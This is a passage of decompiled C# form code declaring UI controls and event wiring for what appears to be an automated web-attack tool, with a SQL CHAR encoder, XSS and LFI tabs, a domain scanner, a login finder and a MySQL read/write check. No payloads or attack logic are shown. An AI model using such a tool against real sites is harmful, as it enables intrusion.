	// (get) Token: 0x06000D7F RID: 3455 RVA: 0x0000784C File Offset: 0x00005A4C
	// (set) Token: 0x06000D80 RID: 3456 RVA: 0x00007854 File Offset: 0x00005A54
	internal virtual Label lblToolsConvertTextValue { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x1700045E RID: 1118
	// (get) Token: 0x06000D81 RID: 3457 RVA: 0x0000785D File Offset: 0x00005A5D
	// (set) Token: 0x06000D82 RID: 3458 RVA: 0x000580D4 File Offset: 0x000562D4
	internal virtual Button btnConvertTextToHex
	{
		[CompilerGenerated]
		get
		{
			return this._btnConvertTextToHex;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler value2 = new EventHandler(this.method_135);
			Button btnConvertTextToHex = this._btnConvertTextToHex;
			if (btnConvertTextToHex != null)
			{
				btnConvertTextToHex.Click -= value2;
			}
			this._btnConvertTextToHex = value;
			btnConvertTextToHex = this._btnConvertTextToHex;
			if (btnConvertTextToHex != null)
			{
				btnConvertTextToHex.Click += value2;
			}
		}
	}

	// Token: 0x1700045F RID: 1119
	// (get) Token: 0x06000D83 RID: 3459 RVA: 0x00007865 File Offset: 0x00005A65
	// (set) Token: 0x06000D84 RID: 3460 RVA: 0x00058118 File Offset: 0x00056318
	internal virtual TextBox txtHexValue
	{
		[CompilerGenerated]
		get
		{
			return this._txtHexValue;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler value2 = new EventHandler(this.method_130);
			TextBox txtHexValue = this._txtHexValue;
			if (txtHexValue != null)
			{
				txtHexValue.TextChanged -= value2;
			}
			this._txtHexValue = value;
			txtHexValue = this._txtHexValue;
			if (txtHexValue != null)
			{
				txtHexValue.TextChanged += value2;
			}
		}
	}

	// Token: 0x17000460 RID: 1120
	// (get) Token: 0x06000D85 RID: 3461 RVA: 0x0000786D File Offset: 0x00005A6D
	// (set) Token: 0x06000D86 RID: 3462 RVA: 0x00007875 File Offset: 0x00005A75
	internal virtual Label lblToolsConvertHexValue { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x17000461 RID: 1121
	// (get) Token: 0x06000D87 RID: 3463 RVA: 0x0000787E File Offset: 0x00005A7E
	// (set) Token: 0x06000D88 RID: 3464 RVA: 0x0005815C File Offset: 0x0005635C
	internal virtual Button btnHexToText
	{
		[CompilerGenerated]
		get
		{
			return this._btnHexToText;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler value2 = new EventHandler(this.method_136);
			Button btnHexToText = this._btnHexToText;
			if (btnHexToText != null)
			{
				btnHexToText.Click -= value2;
			}
			this._btnHexToText = value;
			btnHexToText = this._btnHexToText;
			if (btnHexToText != null)
			{
				btnHexToText.Click += value2;
			}
		}
	}

	// Token: 0x17000462 RID: 1122
	// (get) Token: 0x06000D89 RID: 3465 RVA: 0x00007886 File Offset: 0x00005A86
	// (set) Token: 0x06000D8A RID: 3466 RVA: 0x000581A0 File Offset: 0x000563A0
	internal virtual CheckBox chkGroupChar
	{
		[CompilerGenerated]
		get
		{
			return this._chkGroupChar;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler value2 = new EventHandler(this.method_138);
			CheckBox chkGroupChar = this._chkGroupChar;
			if (chkGroupChar != null)
			{
				chkGroupChar.CheckedChanged -= value2;
			}
			this._chkGroupChar = value;
			chkGroupChar = this._chkGroupChar;
			if (chkGroupChar != null)
			{
				chkGroupChar.CheckedChanged += value2;
			}
		}
	}

	// Token: 0x17000463 RID: 1123
	// (get) Token: 0x06000D8B RID: 3467 RVA: 0x0000788E File Offset: 0x00005A8E
	// (set) Token: 0x06000D8C RID: 3468 RVA: 0x000581E4 File Offset: 0x000563E4
	internal virtual Button butTextToSQLChar
	{
		[CompilerGenerated]
		get
		{
			return this._butTextToSQLChar;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler value2 = new EventHandler(this.method_137);
			Button butTextToSQLChar = this._butTextToSQLChar;
			if (butTextToSQLChar != null)
			{
				butTextToSQLChar.Click -= value2;
			}
			this._butTextToSQLChar = value;
			butTextToSQLChar = this._butTextToSQLChar;
			if (butTextToSQLChar != null)
			{
				butTextToSQLChar.Click += value2;
			}
		}
	}

	// Token: 0x17000464 RID: 1124
	// (get) Token: 0x06000D8D RID: 3469 RVA: 0x00007896 File Offset: 0x00005A96
	// (set) Token: 0x06000D8E RID: 3470 RVA: 0x0000789E File Offset: 0x00005A9E
	internal virtual GroupBox grbToolsConvertEnc { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x17000465 RID: 1125
	// (get) Token: 0x06000D8F RID: 3471 RVA: 0x000078A7 File Offset: 0x00005AA7
	// (set) Token: 0x06000D90 RID: 3472 RVA: 0x00058228 File Offset: 0x00056428
	internal virtual Button btnURLDecondingToText
	{
		[CompilerGenerated]
		get
		{
			return this._btnURLDecondingToText;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler value2 = new EventHandler(this.method_132);
			Button btnURLDecondingToText = this._btnURLDecondingToText;
			if (btnURLDecondingToText != null)
			{
				btnURLDecondingToText.Click -= value2;
			}
			this._btnURLDecondingToText = value;
			btnURLDecondingToText = this._btnURLDecondingToText;
			if (btnURLDecondingToText != null)
			{
				btnURLDecondingToText.Click += value2;
			}
		}
	}

	// Token: 0x17000466 RID: 1126
	// (get) Token: 0x06000D91 RID: 3473 RVA: 0x000078AF File Offset: 0x00005AAF
	// (set) Token: 0x06000D92 RID: 3474 RVA: 0x0005826C File Offset: 0x0005646C
	internal virtual Button btnTextToURLEnconding
	{
		[CompilerGenerated]
		get
		{
			return this._btnTextToURLEnconding;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler value2 = new EventHandler(this.method_131);
			Button btnTextToURLEnconding = this._btnTextToURLEnconding;
			if (btnTextToURLEnconding != null)
			{
				btnTextToURLEnconding.Click -= value2;
			}
			this._btnTextToURLEnconding = value;
			btnTextToURLEnconding = this._btnTextToURLEnconding;
			if (btnTextToURLEnconding != null)
			{
				btnTextToURLEnconding.Click += value2;
			}
		}
	}

	// Token: 0x17000467 RID: 1127
	// (get) Token: 0x06000D93 RID: 3475 RVA: 0x000078B7 File Offset: 0x00005AB7
	// (set) Token: 0x06000D94 RID: 3476 RVA: 0x000582B0 File Offset: 0x000564B0
	internal virtual Button btnBase64ToText
	{
		[CompilerGenerated]
		get
		{
			return this._btnBase64ToText;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler value2 = new EventHandler(this.method_134);
			Button btnBase64ToText = this._btnBase64ToText;
			if (btnBase64ToText != null)
			{
				btnBase64ToText.Click -= value2;
			}
			this._btnBase64ToText = value;
			btnBase64ToText = this._btnBase64ToText;
			if (btnBase64ToText != null)
			{
				btnBase64ToText.Click += value2;
			}
		}
	}

	// Token: 0x17000468 RID: 1128
	// (get) Token: 0x06000D95 RID: 3477 RVA: 0x000078BF File Offset: 0x00005ABF
	// (set) Token: 0x06000D96 RID: 3478 RVA: 0x000582F4 File Offset: 0x000564F4
	internal virtual Button btnTextToBase64
	{
		[CompilerGenerated]
		get
		{
			return this._btnTextToBase64;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler value2 = new EventHandler(this.method_133);
			Button btnTextToBase = this._btnTextToBase64;
			if (btnTextToBase != null)
			{
				btnTextToBase.Click -= value2;
			}
			this._btnTextToBase64 = value;
			btnTextToBase = this._btnTextToBase64;
			if (btnTextToBase != null)
			{
				btnTextToBase.Click += value2;
			}
		}
	}

	// Token: 0x17000469 RID: 1129
	// (get) Token: 0x06000D97 RID: 3479 RVA: 0x000078C7 File Offset: 0x00005AC7
	// (set) Token: 0x06000D98 RID: 3480 RVA: 0x000078CF File Offset: 0x00005ACF
	internal virtual Label lblToolsIPport { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x1700046A RID: 1130
	// (get) Token: 0x06000D99 RID: 3481 RVA: 0x000078D8 File Offset: 0x00005AD8
	// (set) Token: 0x06000D9A RID: 3482 RVA: 0x00058338 File Offset: 0x00056538
	internal virtual Button btnToolsClean
	{
		[CompilerGenerated]
		get
		{
			return this._btnToolsClean;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler value2 = new EventHandler(this.method_128);
			Button btnToolsClean = this._btnToolsClean;
			if (btnToolsClean != null)
			{
				btnToolsClean.Click -= value2;
			}
			this._btnToolsClean = value;
			btnToolsClean = this._btnToolsClean;
			if (btnToolsClean != null)
			{
				btnToolsClean.Click += value2;
			}
		}
	}

	// Token: 0x1700046B RID: 1131
	// (get) Token: 0x06000D9B RID: 3483 RVA: 0x000078E0 File Offset: 0x00005AE0
	// (set) Token: 0x06000D9C RID: 3484 RVA: 0x000078E8 File Offset: 0x00005AE8
	internal virtual GroupBox grbScanner { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x1700046C RID: 1132
	// (get) Token: 0x06000D9D RID: 3485 RVA: 0x000078F1 File Offset: 0x00005AF1
	// (set) Token: 0x06000D9E RID: 3486 RVA: 0x000078F9 File Offset: 0x00005AF9
	internal virtual ListViewExt lvwScannerDomain { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x1700046D RID: 1133
	// (get) Token: 0x06000D9F RID: 3487 RVA: 0x00007902 File Offset: 0x00005B02
	// (set) Token: 0x06000DA0 RID: 3488 RVA: 0x0000790A File Offset: 0x00005B0A
	internal virtual ColumnHeader ColumnHeader32 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x1700046E RID: 1134
	// (get) Token: 0x06000DA1 RID: 3489 RVA: 0x00007913 File Offset: 0x00005B13
	// (set) Token: 0x06000DA2 RID: 3490 RVA: 0x0000791B File Offset: 0x00005B1B
	internal virtual ColumnHeader ColumnHeader33 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x1700046F RID: 1135
	// (get) Token: 0x06000DA3 RID: 3491 RVA: 0x00007924 File Offset: 0x00005B24
	// (set) Token: 0x06000DA4 RID: 3492 RVA: 0x0005837C File Offset: 0x0005657C
	internal virtual ContextMenuStrip mnuScannerDomain
	{
		[CompilerGenerated]
		get
		{
			return this._mnuChecked_8;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			CancelEventHandler value2 = new CancelEventHandler(this.method_99);
			ContextMenuStrip mnuChecked_ = this._mnuChecked_8;
			if (mnuChecked_ != null)
			{
				mnuChecked_.Opening -= value2;
			}
			this._mnuChecked_8 = value;
			mnuChecked_ = this._mnuChecked_8;
			if (mnuChecked_ != null)
			{
				mnuChecked_.Opening += value2;
			}
		}
	}

	// Token: 0x17000470 RID: 1136
	// (get) Token: 0x06000DA5 RID: 3493 RVA: 0x0000792C File Offset: 0x00005B2C
	// (set) Token: 0x06000DA6 RID: 3494 RVA: 0x000583C0 File Offset: 0x000565C0
	internal virtual ToolStripMenuItem ScannerDomainEdit
	{
		[CompilerGenerated]
		get
		{
			return this._ScannerDomainEdit;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler value2 = new EventHandler(this.method_100);
			ToolStripMenuItem scannerDomainEdit = this._ScannerDomainEdit;
			if (scannerDomainEdit != null)
			{
				scannerDomainEdit.Click -= value2;
			}
			this._ScannerDomainEdit = value;
			scannerDomainEdit = this._ScannerDomainEdit;
			if (scannerDomainEdit != null)
			{
				scannerDomainEdit.Click += value2;
			}
		}
	}

	// Token: 0x17000471 RID: 1137
	// (get) Token: 0x06000DA7 RID: 3495 RVA: 0x00007934 File Offset: 0x00005B34
	// (set) Token: 0x06000DA8 RID: 3496 RVA: 0x0000793C File Offset: 0x00005B3C
	internal virtual TabPage TabPage4 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x17000472 RID: 1138
	// (get) Token: 0x06000DA9 RID: 3497 RVA: 0x00007945 File Offset: 0x00005B45
	// (set) Token: 0x06000DAA RID: 3498 RVA: 0x0000794D File Offset: 0x00005B4D
	internal virtual TabPage TabPage5 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x17000473 RID: 1139
	// (get) Token: 0x06000DAB RID: 3499 RVA: 0x00007956 File Offset: 0x00005B56
	// (set) Token: 0x06000DAC RID: 3500 RVA: 0x0000795E File Offset: 0x00005B5E
	internal virtual TabPage TabPage6 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x17000474 RID: 1140
	// (get) Token: 0x06000DAD RID: 3501 RVA: 0x00007967 File Offset: 0x00005B67
	// (set) Token: 0x06000DAE RID: 3502 RVA: 0x0000796F File Offset: 0x00005B6F
	internal virtual TabPage tpLfiWin { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x17000475 RID: 1141
	// (get) Token: 0x06000DAF RID: 3503 RVA: 0x00007978 File Offset: 0x00005B78
	// (set) Token: 0x06000DB0 RID: 3504 RVA: 0x00007980 File Offset: 0x00005B80
	internal virtual Panel pnlStatistics { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x17000476 RID: 1142
	// (get) Token: 0x06000DB1 RID: 3505 RVA: 0x00007989 File Offset: 0x00005B89
	// (set) Token: 0x06000DB2 RID: 3506 RVA: 0x00007991 File Offset: 0x00005B91
	internal virtual ListViewExt lvwStatistics { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x17000477 RID: 1143
	// (get) Token: 0x06000DB3 RID: 3507 RVA: 0x0000799A File Offset: 0x00005B9A
	// (set) Token: 0x06000DB4 RID: 3508 RVA: 0x000079A2 File Offset: 0x00005BA2
	internal virtual ColumnHeader ColumnHeader34 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x17000478 RID: 1144
	// (get) Token: 0x06000DB5 RID: 3509 RVA: 0x000079AB File Offset: 0x00005BAB
	// (set) Token: 0x06000DB6 RID: 3510 RVA: 0x000079B3 File Offset: 0x00005BB3
	internal virtual ColumnHeader ColumnHeader35 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x17000479 RID: 1145
	// (get) Token: 0x06000DB7 RID: 3511 RVA: 0x000079BC File Offset: 0x00005BBC
	// (set) Token: 0x06000DB8 RID: 3512 RVA: 0x000079C4 File Offset: 0x00005BC4
	internal virtual GroupBox grbUpdater { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x1700047A RID: 1146
	// (get) Token: 0x06000DB9 RID: 3513 RVA: 0x000079CD File Offset: 0x00005BCD
	// (set) Token: 0x06000DBA RID: 3514 RVA: 0x00058404 File Offset: 0x00056604
	internal virtual Button btnUpdater
	{
		[CompilerGenerated]
		get
		{
			return this._btnUpdater;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler value2 = new EventHandler(this.method_213);
			Button btnUpdater = this._btnUpdater;
			if (btnUpdater != null)
			{
				btnUpdater.Click -= value2;
			}
			this._btnUpdater = value;
			btnUpdater = this._btnUpdater;
			if (btnUpdater != null)
			{
				btnUpdater.Click += value2;
			}
		}
	}

	// Token: 0x1700047B RID: 1147
	// (get) Token: 0x06000DBB RID: 3515 RVA: 0x000079D5 File Offset: 0x00005BD5
	// (set) Token: 0x06000DBC RID: 3516 RVA: 0x000079DD File Offset: 0x00005BDD
	internal virtual ComboBox cmbUpdater { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x1700047C RID: 1148
	// (get) Token: 0x06000DBD RID: 3517 RVA: 0x000079E6 File Offset: 0x00005BE6
	// (set) Token: 0x06000DBE RID: 3518 RVA: 0x00058448 File Offset: 0x00056648
	internal virtual CheckBox chkUpdater
	{
		[CompilerGenerated]
		get
		{
			return this._chkUpdater;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler value2 = new EventHandler(this.method_101);
			CheckBox chkUpdater = this._chkUpdater;
			if (chkUpdater != null)
			{
				chkUpdater.CheckedChanged -= value2;
			}
			this._chkUpdater = value;
			chkUpdater = this._chkUpdater;
			if (chkUpdater != null)
			{
				chkUpdater.CheckedChanged += value2;
			}
		}
	}

	// Token: 0x1700047D RID: 1149
	// (get) Token: 0x06000DBF RID: 3519 RVA: 0x000079EE File Offset: 0x00005BEE
	// (set) Token: 0x06000DC0 RID: 3520 RVA: 0x0005848C File Offset: 0x0005668C
	internal virtual ToolStripComboBox cmbSearchColumnType
	{
		[CompilerGenerated]
		get
		{
			return this._cmbSearchColumnType;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			MouseEventHandler value2 = new MouseEventHandler(this.method_178);
			ToolStripComboBox cmbSearchColumnType = this._cmbSearchColumnType;
			if (cmbSearchColumnType != null)
			{
				cmbSearchColumnType.MouseDown -= value2;
			}
			this._cmbSearchColumnType = value;
			cmbSearchColumnType = this._cmbSearchColumnType;
			if (cmbSearchColumnType != null)
			{
				cmbSearchColumnType.MouseDown += value2;
			}
		}
	}

	// Token: 0x1700047E RID: 1150
	// (get) Token: 0x06000DC1 RID: 3521 RVA: 0x000079F6 File Offset: 0x00005BF6
	// (set) Token: 0x06000DC2 RID: 3522 RVA: 0x000079FE File Offset: 0x00005BFE
	internal virtual ToolStripSeparator ToolStripSeparator3 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x1700047F RID: 1151
	// (get) Token: 0x06000DC3 RID: 3523 RVA: 0x00007A07 File Offset: 0x00005C07
	// (set) Token: 0x06000DC4 RID: 3524 RVA: 0x00007A0F File Offset: 0x00005C0F
	internal virtual ToolStripProgressBar prbSearchColumn { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x17000480 RID: 1152
	// (get) Token: 0x06000DC5 RID: 3525 RVA: 0x00007A18 File Offset: 0x00005C18
	// (set) Token: 0x06000DC6 RID: 3526 RVA: 0x00007A20 File Offset: 0x00005C20
	internal virtual ToolStripSeparator ToolStripSeparator18 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x17000481 RID: 1153
	// (get) Token: 0x06000DC7 RID: 3527 RVA: 0x00007A29 File Offset: 0x00005C29
	// (set) Token: 0x06000DC8 RID: 3528 RVA: 0x00007A31 File Offset: 0x00005C31
	internal virtual ToolStripLabel lblSearchColumnThreads { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x17000482 RID: 1154
	// (get) Token: 0x06000DC9 RID: 3529 RVA: 0x00007A3A File Offset: 0x00005C3A
	// (set) Token: 0x06000DCA RID: 3530 RVA: 0x000584D0 File Offset: 0x000566D0
	internal virtual NumericUpDown numSearchColumnThreads
	{
		[CompilerGenerated]
		get
		{
			return this._numSearchColumnThreads;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler value2 = new EventHandler(this.method_98);
			NumericUpDown numSearchColumnThreads = this._numSearchColumnThreads;
			if (numSearchColumnThreads != null)
			{
				numSearchColumnThreads.ValueChanged -= value2;
			}
			this._numSearchColumnThreads = value;
			numSearchColumnThreads = this._numSearchColumnThreads;
			if (numSearchColumnThreads != null)
			{
				numSearchColumnThreads.ValueChanged += value2;
			}
		}
	}

	// Token: 0x17000483 RID: 1155
	// (get) Token: 0x06000DCB RID: 3531 RVA: 0x00007A42 File Offset: 0x00005C42
	// (set) Token: 0x06000DCC RID: 3532 RVA: 0x00007A4A File Offset: 0x00005C4A
	internal virtual ToolStripButton btnSearchColumnPause { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x17000484 RID: 1156
	// (get) Token: 0x06000DCD RID: 3533 RVA: 0x00007A53 File Offset: 0x00005C53
	// (set) Token: 0x06000DCE RID: 3534 RVA: 0x00007A5B File Offset: 0x00005C5B
	internal virtual ToolStripSeparator btnSearchColumnSP { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x17000485 RID: 1157
	// (get) Token: 0x06000DCF RID: 3535 RVA: 0x00007A64 File Offset: 0x00005C64
	// (set) Token: 0x06000DD0 RID: 3536 RVA: 0x00007A6C File Offset: 0x00005C6C
	internal virtual ToolStripButton btnSearchColumnStop { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x17000486 RID: 1158
	// (get) Token: 0x06000DD1 RID: 3537 RVA: 0x00007A75 File Offset: 0x00005C75
	// (set) Token: 0x06000DD2 RID: 3538 RVA: 0x00058514 File Offset: 0x00056714
	internal virtual ToolStripMenuItem mnuLWAlexa
	{
		[CompilerGenerated]
		get
		{
			return this._mnuLWAlexa;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler value2 = new EventHandler(this.method_160);
			ToolStripMenuItem mnuLWAlexa = this._mnuLWAlexa;
			if (mnuLWAlexa != null)
			{
				mnuLWAlexa.Click -= value2;
			}
			this._mnuLWAlexa = value;
			mnuLWAlexa = this._mnuLWAlexa;
			if (mnuLWAlexa != null)
			{
				mnuLWAlexa.Click += value2;
			}
		}
	}

	// Token: 0x17000487 RID: 1159
	// (get) Token: 0x06000DD3 RID: 3539 RVA: 0x00007A7D File Offset: 0x00005C7D
	// (set) Token: 0x06000DD4 RID: 3540 RVA: 0x00058558 File Offset: 0x00056758
	internal virtual BackgroundWorker bckAlexa
	{
		[CompilerGenerated]
		get
		{
			return this.backgroundWorker_1;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			DoWorkEventHandler value2 = new DoWorkEventHandler(this.method_190);
			RunWorkerCompletedEventHandler value3 = new RunWorkerCompletedEventHandler(this.method_191);
			BackgroundWorker backgroundWorker = this.backgroundWorker_1;
			if (backgroundWorker != null)
			{
				backgroundWorker.DoWork -= value2;
				backgroundWorker.RunWorkerCompleted -= value3;
			}
			this.backgroundWorker_1 = value;
			backgroundWorker = this.backgroundWorker_1;
			if (backgroundWorker != null)
			{
				backgroundWorker.DoWork += value2;
				backgroundWorker.RunWorkerCompleted += value3;
			}
		}
	}

	// Token: 0x17000488 RID: 1160
	// (get) Token: 0x06000DD5 RID: 3541 RVA: 0x00007A85 File Offset: 0x00005C85
	// (set) Token: 0x06000DD6 RID: 3542 RVA: 0x00007A8D File Offset: 0x00005C8D
	internal virtual CheckBox chkAnalizeMySQLReadWrite { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x17000489 RID: 1161
	// (get) Token: 0x06000DD7 RID: 3543 RVA: 0x00007A96 File Offset: 0x00005C96
	// (set) Token: 0x06000DD8 RID: 3544 RVA: 0x00007A9E File Offset: 0x00005C9E
	internal virtual Panel pnlLoginFinder { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x1700048A RID: 1162
	// (get) Token: 0x06000DD9 RID: 3545 RVA: 0x00007AA7 File Offset: 0x00005CA7
	// (set) Token: 0x06000DDA RID: 3546 RVA: 0x000585B8 File Offset: 0x000567B8
	internal virtual ComboBox cmbLanguages
	{
		[CompilerGenerated]
		get
		{
			return this._cmbLanguages;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler value2 = new EventHandler(this.method_108);
			ComboBox cmbLanguages = this._cmbLanguages;
			if (cmbLanguages != null)
			{
				cmbLanguages.SelectedIndexChanged -= value2;
			}
			this._cmbLanguages = value;
			cmbLanguages = this._cmbLanguages;
			if (cmbLanguages != null)
			{
				cmbLanguages.SelectedIndexChanged += value2;
			}
		}
	}

	// Token: 0x1700048B RID: 1163
	// (get) Token: 0x06000DDB RID: 3547 RVA: 0x00007AAF File Offset: 0x00005CAF
	// (set) Token: 0x06000DDC RID: 3548 RVA: 0x00007AB7 File Offset: 0x00005CB7
	internal virtual Label lblLanguage { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x1700048C RID: 1164
	// (get) Token: 0x06000DDD RID: 3549 RVA: 0x00007AC0 File Offset: 0x00005CC0
	// (set) Token: 0x06000DDE RID: 3550 RVA: 0x00007AC8 File Offset: 0x00005CC8
	internal virtual GroupBox grbXSS { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x1700048D RID: 1165
	// (get) Token: 0x06000DDF RID: 3551 RVA: 0x00007AD1 File Offset: 0x00005CD1
	// (set) Token: 0x06000DE0 RID: 3552 RVA: 0x00007AD9 File Offset: 0x00005CD9
	internal virtual ListViewExt lvwXSS { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x1700048E RID: 1166
	// (get) Token: 0x06000DE1 RID: 3553 RVA: 0x00007AE2 File Offset: 0x00005CE2
	// (set) Token: 0x06000DE2 RID: 3554 RVA: 0x00007AEA File Offset: 0x00005CEA
	internal virtual ColumnHeader ColumnHeader36 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x1700048F RID: 1167
	// (get) Token: 0x06000DE3 RID: 3555 RVA: 0x00007AF3 File Offset: 0x00005CF3
	// (set) Token: 0x06000DE4 RID: 3556 RVA: 0x00007AFB File Offset: 0x00005CFB
	internal virtual ColumnHeader ColumnHeader37 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x17000490 RID: 1168
	// (get) Token: 0x06000DE5 RID: 3557 RVA: 0x00007B04 File Offset: 0x00005D04
	// (set) Token: 0x06000DE6 RID: 3558 RVA: 0x000585FC File Offset: 0x000567FC
	internal virtual BackgroundWorker bckImport
	{
		[CompilerGenerated]
		get
		{
			return this.backgroundWorker_2;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			DoWorkEventHandler value2 = new DoWorkEventHandler(this.method_103);
			ProgressChangedEventHandler value3 = new ProgressChangedEventHandler(this.method_104);
			RunWorkerCompletedEventHandler value4 = new RunWorkerCompletedEventHandler(this.method_105);
			BackgroundWorker backgroundWorker = this.backgroundWorker_2;
			if (backgroundWorker != null)
			{
				backgroundWorker.DoWork -= value2;
				backgroundWorker.ProgressChanged -= value3;
				backgroundWorker.RunWorkerCompleted -= value4;
			}
			this.backgroundWorker_2 = value;
			backgroundWorker = this.backgroundWorker_2;
			if (backgroundWorker != null)
			{
				backgroundWorker.DoWork += value2;
				backgroundWorker.ProgressChanged += value3;
				backgroundWorker.RunWorkerCompleted += value4;
			}
		}
	}

	// Token: 0x17000491 RID: 1169
	// (get) Token: 0x06000DE7 RID: 3559 RVA: 0x00007B0C File Offset: 0x00005D0C
	// (set) Token: 0x06000DE8 RID: 3560 RVA: 0x00007B14 File Offset: 0x00005D14
	internal virtual GroupBox GroupBox2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x17000492 RID: 1170
	// (get) Token: 0x06000DE9 RID: 3561 RVA: 0x00007B1D File Offset: 0x00005D1D
	// (set) Token: 0x06000DEA RID: 3562 RVA: 0x00058678 File Offset: 0x00056878
	internal virtual Button btnXmlImport8x
	{
		[CompilerGenerated]
		get
		{
			return this._btnXmlImport8x;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler value2 = new EventHandler(this.method_102);
			Button btnXmlImport8x = this._btnXmlImport8x;
			if (btnXmlImport8x != null)
			{
				btnXmlImport8x.Click -= value2;
			}
			this._btnXmlImport8x = value;
			btnXmlImport8x = this._btnXmlImport8x;
			if (btnXmlImport8x != null)
			{
				btnXmlImport8x.Click += value2;
			}
		}
	}

	// Token: 0x17000493 RID: 1171
	// (get) Token: 0x06000DEB RID: 3563 RVA: 0x00007B25 File Offset: 0x00005D25
	// (set) Token: 0x06000DEC RID: 3564 RVA: 0x00007B2D File Offset: 0x00005D2D
	internal virtual ProgressBar prbImport { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x17000494 RID: 1172
	// (get) Token: 0x06000DED RID: 3565 RVA: 0x00007B36 File Offset: 0x00005D36
	// (set) Token: 0x06000DEE RID: 3566 RVA: 0x000586BC File Offset: 0x000568BC
	internal virtual ToolStripButton chkSearchColumn
	{
		[CompilerGenerated]
		get
		{
			return this._chkSearchColumn;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler value2 = new EventHandler(this.method_181);
			ToolStripButton chkSearchColumn = this._chkSearchColumn;
			if (chkSearchColumn != null)
			{
				chkSearchColumn.CheckedChanged -= value2;
			}
			this._chkSearchColumn = value;
			chkSearchColumn = this._chkSearchColumn;
			if (chkSearchColumn != null)
			{
				chkSearchColumn.CheckedChanged += value2;
			}
		}
	}

	// Token: 0x17000495 RID: 1173
	// (get) Token: 0x06000DEF RID: 3567 RVA: 0x00007B3E File Offset: 0x00005D3E
	// (set) Token: 0x06000DF0 RID: 3568 RVA: 0x00058700 File Offset: 0x00056900
	internal virtual ToolStripButton chkSearchColumn2
	{
		[CompilerGenerated]
		get
		{
			return this._chkSearchColumn2;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler value2 = new EventHandler(this.method_182);
			ToolStripButton chkSearchColumn = this._chkSearchColumn2;
			if (chkSearchColumn != null)
			{
				chkSearchColumn.CheckedChanged -= value2;
			}
			this._chkSearchColumn2 = value;
			chkSearchColumn = this._chkSearchColumn2;
			if (chkSearchColumn != null)
			{
